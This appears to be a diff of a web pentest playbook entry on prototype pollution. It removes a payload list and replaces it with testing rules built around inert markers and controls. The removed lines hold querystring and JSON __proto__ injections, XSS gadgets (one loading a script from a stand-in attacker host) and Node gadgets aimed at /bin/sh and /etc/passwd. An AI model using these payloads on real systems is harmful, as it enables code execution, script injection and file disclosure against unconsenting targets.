@@ -1,81 +1,26 @@
-# PAYLOADS — Prototype Pollution
+# Context payload lookup: prototype pollution
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [prototype_pollution.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/prototype_pollution.md).
 
-## 11. Prototype Pollution
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-### CLIENT-SIDE QUERYSTRING
-```
-?__proto__[admin]=true
-?__proto__.admin=true
-?constructor[prototype][admin]=true
-?constructor.prototype.admin=true
-?[__proto__][admin]=true
-?["__proto__"]["admin"]=true
-```
+## Select the experiment
 
-### JSON BODY
-```json
-{"__proto__":{"admin":true}}
-{"__proto__.admin":true}
-{"constructor":{"prototype":{"admin":true}}}
-{"a":{"__proto__":{"admin":true}}}
-```
+- Contexts: Unsafe assignment / prototype scope / inherited-property gadget.
+- Use a unique inert property and a fresh process for lab cleanup. JSON.parse alone does not modify Object.prototype. Do not overwrite core methods or use crashes as the default detection signal.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
-### DEEP MERGE GADGET PROBES
-```javascript
-// Probe in browser console after suspected pollution
-console.log({}.admin)
-console.log({}.foo)
-// If returns true / value → pollution succeeded
-```
+## Return to the owning methodology
 
-### CLIENT-SIDE GADGETS (PP → XSS)
-```javascript
-// jQuery $.get with crossDomain inherited
-?__proto__[crossDomain]=true&__proto__[url]=//attacker.tld/xss.js
-
-// AdsBypass — google ads load
-?__proto__[head][_owner][stateNode][onclick]=alert(1)
-
-// AngularJS
-?__proto__[ngBindHtml]=<img src=x onerror=alert(1)>
-
-// Lodash _.template (versions <4.17.20)
-?__proto__[sourceURL]=\\u2028\\u2028alert(1)//
-
-// React via dangerouslySetInnerHTML pollution
-
-// Vue via v-bind options
-```
-
-### SERVER-SIDE GADGETS (PP → RCE in Node)
-```json
-// child_process.spawn via env / shell
-{"__proto__":{"shell":"/bin/sh","argv0":"x"}}
-
-// Express render via view options
-{"__proto__":{"layout":"/etc/passwd"}}
-
-// Node's process.binding
-{"__proto__":{"main":"/etc/passwd"}}
-
-// hbs template engine
-{"__proto__":{"main.js":"//../../etc/passwd"}}
-```
-
-### EXPLOITATION CHAIN
-```bash
-# 1. find pollution point (e.g., merge / set / path-set in lodash, jQuery.extend, mongoose ...)
-# 2. probe gadget with __proto__[FOO]=1 → check {}.FOO
-# 3. find sink that uses inherited prop (CSP src, template engine option, child_process arg)
-# 4. craft full chain
-```
-
-### TOOLS
-- ppmap (Burp ext)
-- ppfuzz
-- pp-finder
-- portswigger DOM Invader
-
----
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
